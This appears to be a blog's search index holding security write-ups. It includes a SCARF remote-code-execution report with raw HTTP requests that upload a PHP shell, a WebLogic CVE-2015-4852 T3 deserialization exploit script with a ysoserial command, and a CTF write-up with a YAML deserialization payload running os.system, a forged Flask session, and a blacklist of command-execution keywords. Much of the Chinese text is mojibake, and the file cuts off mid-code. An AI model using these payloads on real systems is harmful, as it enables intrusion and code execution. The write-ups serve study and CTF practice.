<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SCARF Vulnerability Report</title>
    <url>/2022/03/24/SCARF-Vulnerability-Report/</url>
    <content><![CDATA[<p>SCARF Vulnerability Report</p>
<a id="more"></a>

<p>generaloptions.php in Paul Tarjan Stanford Conference And Research Forum (SCARF) before 20070227 exists a remote command execution vulnerability. </p>
<p>In generaloptions.php,</p>
<p><img src="/2022/03/24/SCARF-Vulnerability-Report/image-20220324132208980.png" alt="image-20220324132208980"></p>
<p>The fifth line will modify the data in the options table in the database according to the key value entered in the POST method in the HTTP request.<br>The options table structure in the database is as follows:</p>
<p><img src="/2022/03/24/SCARF-Vulnerability-Report/image-20220324132232923.png" alt="image-20220324132232923"></p>
<p>Here you can modify any value field in the options table,<br>In line 11, traverse each uploaded file, query the corresponding <em>value</em> value in the <em>options</em> table according to $name, and then call the move_uploaded_file function to move the uploaded temporary file to the path corresponding to the <em>value</em> value.<br>First enter Background Image as shell.php in post mode.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;scarf&#x2F;generaloptions.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.59.182</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">Background_Image&#x3D;shell.php&amp;submit</span><br></pre></td></tr></table></figure>

<p>Then upload the file whose content is <code>&lt;?php phpinfo();?&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;scarf&#x2F;generaloptions.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.59.182</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryCgwbsOJquAiouDkj</span><br><span class="line">Content-Length: 312</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryCgwbsOJquAiouDkj</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Background Image&quot;; filename&#x3D;&quot;a&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundaryCgwbsOJquAiouDkj</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryCgwbsOJquAiouDkj--</span><br></pre></td></tr></table></figure>

<p>Then visit <a href="http://192.168.59.182/scarf/shell.php" target="_blank" rel="noopener">http://192.168.59.182/scarf/shell.php</a></p>
<p><img src="/2022/03/24/SCARF-Vulnerability-Report/image-20220324132428013.png" alt="image-20220324132428013"></p>
]]></content>
  </entry>
  <entry>
    <title>2021ByteCTFwebé¢˜ç›®</title>
    <url>/2021/10/19/2021ByteCTFweb%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>ByteCTFå‡ é“Webé¢˜ç›®å¤ç°</p>
<a id="more"></a>
]]></content>
  </entry>
  <entry>
    <title>weblogicæ¼æ´åˆ†æâ€”â€”CVE-2015-4852</title>
    <url>/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/</url>
    <content><![CDATA[<p>å‚è€ƒå‡ ä½å¸ˆå‚…çš„æ–‡ç« å¤ç°åˆ†æä¸‹weblogicçš„æ¼æ´</p>
<a id="more"></a>

<p>ç¯å¢ƒæ­å»ºå‚è€ƒå‰ç¯‡æ–‡ç« </p>
<h2 id="0x01-t3åè®®"><a href="#0x01-t3åè®®" class="headerlink" title="0x01 t3åè®®"></a>0x01 t3åè®®</h2><p>å‚è€ƒY4erå¸ˆå‚…çš„æ–‡ç« ï¼Œåœ¨weblogicçš„<code>~/Oracle/Middleware/user_projects/domains/base_domain/bin/stopWebLogic.sh</code>æ–‡ä»¶ä¸­ä½¿ç”¨äº†<code>t3://</code>åè®®ï¼Œç„¶åè¿è¡Œè¯¥è„šæœ¬ï¼Œä¹‹ååˆ©ç”¨tcpdumpæŠ“å–t3åè®®åŒ…ï¼Œtcpdumpå‘½ä»¤è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: tcpdump [-aAbdDefhHIJKlLnNOpqStuUvxX#] [ -B size ] [ -c count ]</span><br><span class="line">		[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]</span><br><span class="line">		[ -i interface ] [ -j tstamptype ] [ -M secret ] [ --number ]</span><br><span class="line">		[ -Q in|out|inout ]</span><br><span class="line">		[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision ]</span><br><span class="line">		[ --immediate-mode ] [ -T type ] [ --version ] [ -V file ]</span><br><span class="line">		[ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ]</span><br><span class="line">		[ -Z user ] [ expression ]</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ¬¡æ‰§è¡Œè„šæœ¬åæ²¡æœ‰æˆªåˆ°åŒ…ï¼ŒæŸ¥çœ‹stopWeblogic.shæ–‡ä»¶ï¼Œå‘ç°é‡Œé¢ä¸º<code>t3://virtual-machine:7001</code>ï¼Œå¯èƒ½æ˜¯åœ¨è™šæ‹Ÿæœºé‡Œæ­å»ºçš„åŸå› ï¼Œä¿®æ”¹ä¸ºè™šæ‹Ÿæœºå¯¹åº”çš„IPï¼Œ</p>
<p><code>sudo tcpdump -i any -w dump.pcap</code></p>
<p><code>./stopWeblogic.sh</code></p>
<p><img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/image-20201204194304550.png" alt="image-20201204194304550"></p>
<p>æœç´¢<code>aced</code>å¯ä»¥å¾—åˆ°ä¸Šå›¾ï¼Œç„¶åè¿½è¸ªæµ</p>
<p><img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/image-20201204194417570.png" alt="image-20201204194417570"></p>
<p><img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/image-20201204202615084.png" alt="image-20201204202615084"></p>
<p>å‚è€ƒç½‘ä¸Šçš„æ–‡ç« ï¼Œå¾—åˆ°T3åè®®è§„èŒƒå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<blockquote>
<p><img src="https://y4er.com/img/uploads/20200130161825.png" alt="20200130161825"></p>
</blockquote>
<p>å› ä¸ºåœ¨ç¬¬ä¸€éƒ¨åˆ†ä¼šæ£€éªŒæ•´ä¸ªåŒ…çš„é•¿åº¦ï¼Œæ‰€ä»¥ä¼ªé€ ç¬¬2-6éƒ¨åˆ†æ˜¯å¤±è´¥çš„ï¼Œçœ‹ç½‘ä¸Šæ–‡ç« è¯´å¯ä»¥ç›´æ¥åœ¨ç¬¬äºŒä¸ªéƒ¨åˆ†æ”¹ä¸ºæ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œå¹¶æ›´æ–°ç¬¬ä¸€éƒ¨åˆ†çš„å‰4 ä¸ªé•¿åº¦å­—èŠ‚ï¼Œç„¶åå‘é€ç»™æœåŠ¡ç«¯å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–ã€‚</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_address = (host, int(port))</span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(server_address)</span><br><span class="line">        headers = <span class="string">'t3 12.2.1\nAS:255\nHL:19\n\n'</span>.format(port)</span><br><span class="line">        sock.sendall(headers)</span><br><span class="line">        data = sock.recv(<span class="number">2</span>)</span><br><span class="line">        f = open(<span class="string">'./tmp'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        payload_obj = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        payload1 = <span class="string">"000005bc016501ffffffffffffffff0000006a0000ea600000001900abfd73bd92748c5603c5aff9ffd43a6bb4c295fb51ac6a4d027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">        payload2 = payload_obj</span><br><span class="line">        payload = payload1 + payload2<span class="comment"># + payload3</span></span><br><span class="line"></span><br><span class="line">        payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:]<span class="comment">#æ›´æ–°é•¿åº¦</span></span><br><span class="line"></span><br><span class="line">        sock.send(payload)</span><br><span class="line">        data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">u'socket è¿æ¥å¼‚å¸¸ï¼'</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">exp(<span class="string">'192.168.59.131'</span>, <span class="number">7001</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;touch &#x2F;tmp&#x2F;exp&quot; &gt; .&#x2F;CVE-2015-4852deserialize&#x2F;tmp</span><br><span class="line"></span><br><span class="line">python2 exp.py</span><br></pre></td></tr></table></figure>



<blockquote>
<img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/jndiarch.gif" alt="img" style="zoom: 150%;">

<p><a href="https://seaii-blog.com/index.php/2019/12/29/92.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2019/12/29/92.html</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">016501ffffffffffffffff0000006a0000ea600000001900abfd73bd92748c5603c5aff9ffd43a6bb4c295fb51ac6a4d027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000</span><br><span class="line"></span><br><span class="line">016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006</span><br></pre></td></tr></table></figure>

<h2 id="0x02-è°ƒè¯•åˆ†æ"><a href="#0x02-è°ƒè¯•åˆ†æ" class="headerlink" title="0x02 è°ƒè¯•åˆ†æ"></a>0x02 è°ƒè¯•åˆ†æ</h2><p>è°ƒè¯•æ–­ç‚¹ï¼šwlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev</p>
<p><a href="https://y4er.com/post/weblogic-cve-2015-4852/" target="_blank" rel="noopener">https://y4er.com/post/weblogic-cve-2015-4852/</a></p>
<p><a href="https://seaii-blog.com/index.php/2019/12/29/92.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2019/12/29/92.html</a></p>
]]></content>
      <tags>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ç¥¥äº‘æ¯Webé¢˜ç›®writeup</title>
    <url>/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<p>æ²¡æœ‰å’Œå­¦é•¿ä¸€èµ·æ‰“ï¼Œå¹²ä¸åŠ¨ï¼Œå¤ªèœäº†ã€‚</p>
<a id="more"></a>

<h1 id="0x01-profile-system"><a href="#0x01-profile-system" class="headerlink" title="0x01 profile system"></a>0x01 profile system</h1><p>é¢˜ç›®æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = os.path.join(os.curdir, <span class="string">"uploads"</span>)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'Th1s_is_A_Sup333er_s1cret_k1yyyyy'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'yaml'</span>,<span class="string">'yml'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'priviledge'</span>] = <span class="string">'guest'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route("/upload", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.files[<span class="string">"file"</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        flash(<span class="string">'No selected file'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> (allowed_file(file.filename) <span class="keyword">in</span> ALLOWED_EXTENSIONS):</span><br><span class="line">        flash(<span class="string">'Please upload yaml/yml only.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">        filename = file.filename</span><br><span class="line">        session[<span class="string">'filename'</span>] = filename </span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"uploaded.html"</span>,path = os.path.join(dirname, filename))</span><br><span class="line"><span class="meta">@app.route("/uploads/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], path))</span><br><span class="line"><span class="meta">@app.route("/view")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">()</span>:</span></span><br><span class="line">    dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">    realpath = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname,session[<span class="string">'filename'</span>]).replace(<span class="string">'..'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'priviledge'</span>] ==<span class="string">'elite'</span> <span class="keyword">and</span> os.path.isfile(realpath):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(realpath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b"^[ -\-/-\]a-&#125;\n]*$"</span>,data, flags=re.MULTILINE):</span><br><span class="line">                    info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">                    flash(<span class="string">'Sth weird...'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    info = yaml.load(data)</span><br><span class="line">                <span class="keyword">if</span> info[<span class="string">'user'</span>] == <span class="string">'Administrator'</span>:</span><br><span class="line">                    flash(<span class="string">'Welcome admin!'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = &#123;<span class="string">'user'</span>: <span class="string">'guest'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>,user = info[<span class="string">'user'</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>/uploadsè·¯ç”±å­˜åœ¨è·¯å¾„ç©¿è¶Šå¯ä»¥è¯»å–æ–‡ä»¶ï¼Œ</p>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123220630565.png" alt="image-20201123220630565"></p>
<p>è¯»å–æ–‡ä»¶åå®¡è®¡æºç ï¼Œå¯ä»¥å¾—åˆ°<code>python</code>çš„<code>session</code>çš„<code>secret</code>ä¸º<code>Th1s_is_A_Sup333er_s1cret_k1yyyyy</code>,æœ‰ä¸Šä¼ <code>yamlã€yml</code>æ–‡ä»¶çš„åŠŸèƒ½ï¼Œåœ¨<code>/view</code>è·¯ç”±ï¼Œä¼šå°†å®¢æˆ·ç«¯ipçš„md5å€¼æ‹¼æ¥åˆ°uploadï¼Œç„¶åå†æ‹¼æ¥<code>session[filename]</code>ï¼Œä¹‹åæ£€æŸ¥<code>session[&#39;priviledge&#39;] æ˜¯å¦ä¸º&#39;elite&#39;</code>å’Œæ‹¼æ¥å¾—åˆ°çš„æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›å¦‚æœé€šè¿‡æ£€æŸ¥ï¼Œåˆ™è¯»å–æ–‡ä»¶å¯¹åº”çš„å†…å®¹ï¼Œç„¶åå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ­£åˆ™çš„åˆ¤æ–­ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(realpath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	data = f.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b"^[ -\-/-\]a-&#125;\n]*$"</span>,data, flags=re.MULTILINE):</span><br><span class="line">    	info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">        flash(<span class="string">'Sth weird...'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = yaml.load(data)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">'user'</span>] == <span class="string">'Administrator'</span>:</span><br><span class="line">        flash(<span class="string">'Welcome admin!'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ()</span><br></pre></td></tr></table></figure>

<img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123230352889.png" alt="image-20201123230352889" style="zoom:200%;">

<p>ä¸Šé¢æ­£åˆ™å¯¹åº”çš„åŒ¹é…æ¨¡å¼å¦‚ä¸Šå›¾ï¼Œç¦æ­¢äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.  ^  _  &#96;  ~</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å­—ç¬¦ï¼Œå¦‚æœèƒ½å¤Ÿé€šè¿‡æ­£åˆ™çš„æ£€æµ‹ï¼Œå°±ä¼šæ‰§è¡Œyaml.load(data)`ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªyamlçš„ååºåˆ—åŒ–ï¼Œ<a href="https://hackmd.io/@harrier/uiuctf20" target="_blank" rel="noopener">uiuctf 2020</a>è€ƒç‚¹å’Œè¿™é“é¢˜ä¸€æ ·ï¼Œæœ¬åœ°ç”Ÿæˆyamlæ–‡ä»¶ï¼Œ</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="type">!!python</span><span class="string">/object/new:type</span></span><br><span class="line"><span class="attr">args:</span> <span class="string">["z",</span> <span class="type">!!python</span><span class="string">/tuple</span> <span class="string">[],</span> <span class="string">&#123;"extend":</span> <span class="type">!!python</span><span class="string">/name:exec</span> <span class="string">&#125;]</span></span><br><span class="line"><span class="attr">listitems:</span> <span class="string">"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x77\x68\x6f\x61\x6d\x69\x20\x3e\x20\x2e\x2f\x75\x70\x6c\x6f\x61\x64\x73\x2f\x34\x64\x39\x65\x38\x31\x39\x65\x37\x35\x34\x32\x62\x33\x34\x62\x38\x30\x35\x32\x36\x32\x61\x39\x61\x30\x65\x66\x61\x64\x38\x37\x2f\x33\x32\x31\x27\x29"</span></span><br></pre></td></tr></table></figure>

<p>è½¬åå…­è¿›åˆ¶çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str = <span class="string">"__import__('os').system('whoami &gt; ./uploads/4d9e819e7542b34b805262a9a0efad87/321')"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">'\\x'</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str_to_hex(str)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æœ¬åœ°æµ‹è¯•åœ¨win10å†™æ–‡ä»¶å†™å‡ºæ¥çš„æ¢è¡Œæ˜¯<code>\r\n</code>ï¼Œlinuxå†™å‡ºæ¥çš„æ–‡ä»¶æ¢è¡Œæ˜¯<code>\n</code>ï¼Œå¼€å§‹ç”¨win10å†™çš„æ–‡ä»¶éƒ½åŒ…å«<code>\r</code>ï¼Œä¸èƒ½é€šè¿‡æ­£åˆ™æ£€æŸ¥ï¼Œä¹‹åç”¨linuxå°±å¯ä»¥äº†ã€‚<code>%0dâ€”â€”\r    %0aâ€”â€”\n</code></p>
</blockquote>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124202931172.png" alt="image-20201124202931172"></p>
<p>ä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œåˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œç”Ÿæˆsession</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;Th1s_is_A_Sup333er_s1cret_k1yyyyy&quot; -t &quot;&#123;&#39;priviledge&#39;:&#39;elite&#39;,&#39;filename&#39;:&#39;aa.yaml&#39;&#125;&quot;</span><br><span class="line">eyJmaWxlbmFtZSI6ImFhLnlhbWwiLCJwcml2aWxlZGdlIjoiZWxpdGUifQ.X7zvPw.AKiTGPDlkdsETAUVmGYrxCc_7jk</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124203341378.png" alt="image-20201124203341378"></p>
<p>ä¹‹åä¸‹è½½<code>/uploads/4d9e819e7542b34b805262a9a0efad87/321</code>å°±å¯ä»¥å¾—åˆ°ç»“æœã€‚</p>
<h1 id="0x02-flaskbot"><a href="#0x02-flaskbot" class="headerlink" title="0x02 flaskbot"></a>0x02 flaskbot</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,make_response,redirect,url_for,render_template_string</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe</span><span class="params">(str)</span>:</span> </span><br><span class="line">    black_list = [<span class="string">'flag'</span>,<span class="string">'os'</span>,<span class="string">'system'</span>,<span class="string">'popen'</span>,<span class="string">'import'</span>,<span class="string">'eval'</span>,<span class="string">'chr'</span>,<span class="string">'request'</span>, <span class="string">'subprocess'</span>,<span class="string">'commands'</span>,<span class="string">'socket'</span>,<span class="string">'hex'</span>,<span class="string">'base64'</span>,<span class="string">'*'</span>,<span class="string">'?'</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> str.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Damn you hacker! You will never"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessNum</span><span class="params">(num,name)</span>:</span></span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">1000000000.0</span></span><br><span class="line">    mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">    ret=<span class="string">""</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> abs(mid-num)&lt;<span class="number">0.00001</span>:</span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">        <span class="keyword">if</span> mid&gt;num:</span><br><span class="line">            r=mid</span><br><span class="line">            ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is too large&lt;br/&gt;"</span>.format(cnt,mid)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">            ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is too small&lt;br/&gt;"</span>.format(cnt,mid)</span><br><span class="line">        <span class="keyword">if</span> cnt &gt; <span class="number">50</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> cnt &lt; <span class="number">50</span>:</span><br><span class="line">        ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is close enough&lt;br/&gt;I win"</span>.format(cnt,mid)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        ret+=<span class="string">"Wow! &#123;0&#125; win."</span>.format(safe(name))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">        user = request.form[<span class="string">'name'</span>]</span><br><span class="line">        resp = make_response(render_template(<span class="string">"guess.html"</span>,name=user))</span><br><span class="line">        resp.set_cookie(<span class="string">'user'</span>,base64.urlsafe_b64encode(user),max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user=request.cookies.get(<span class="string">'user'</span>)</span><br><span class="line">        <span class="keyword">if</span> user == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user=user.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"guess.html"</span>,name=base64.urlsafe_b64decode(user))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/guess',methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Guess</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.cookies.get(<span class="string">'user'</span>)</span><br><span class="line">    <span class="keyword">if</span> user==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span 